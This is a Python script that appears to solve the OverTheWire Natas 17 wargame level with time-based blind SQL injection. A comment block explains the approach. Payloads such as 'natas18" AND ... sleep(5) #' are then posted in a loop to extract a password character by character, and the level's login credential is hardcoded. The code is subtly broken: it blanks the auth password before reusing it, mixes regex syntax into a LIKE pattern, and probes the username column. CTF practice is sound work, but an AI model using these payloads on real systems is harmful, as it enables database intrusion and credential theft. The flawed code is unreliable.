import requests as req
import re
import time as t
import string as st

characters=st.ascii_letters+st.digits

"""
Again we are given some sort of Username existance funtionality .

From the source code I have found that this time the responses are commneted out . Means Even the username is right or false that won't be reflected in the response .

To exploit this we can use time based sql injection .

SQL Query:
    "SELECT * from users where username="Username" 
Payload:
    "natas18" AND sleep(10)


natas18" AND CASE WHEN SUBSTRING(username,1,1)='n' THEN sleep(10) ELSE 0 END #
"""
username="natas17"
password='EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url="http://%s.natas.labs.overthewire.org/" % username


s=req.Session()

'''
To determine the length of the password
for i in range(1,35):
    data={
        "username":f'natas18\" AND CASE WHEN length(password)={i} THEN sleep(20) ELSE 0 END #',
        "submit":"submit"
    }
    response=s.post(url,auth=(username,password),data=data)
    t2=t.perf_counter()
    if t2-t1>10:
        print(f"Length of the password is {i}")
        break
'''
password=""
for i in range(1,33):
    for ch in characters:
        print(f"Trying username with {i}th character as {ch}")
        t1=t.perf_counter()
        data={
            "username":f'natas18\" AND BINARY username LIKE  \'^{password}{ch}%\' AND sleep(5) #',
            "submit":"submit"
        }
        print(data["username"])
        response=s.post(url,auth=(username,password),data=data)
        t2=t.perf_counter()
        if t2-t1>5:
            print(f"Found {i}th character : {ch}")
            password+=ch
            break

print(f"Password is {password}")
'''data={
    "username":f'natas18\" AND CASE WHEN SUBSTRING(username,1,1)=\"a\" THEN sleep(10) ELSE 0 END #',
    "submit":"submit"
}
print(data["username"])
t1=t.perf_counter()
response=s.post(url,auth=(username,password),data=data)
t2=t.perf_counter()
print(t2-t1)
print(response.text)'''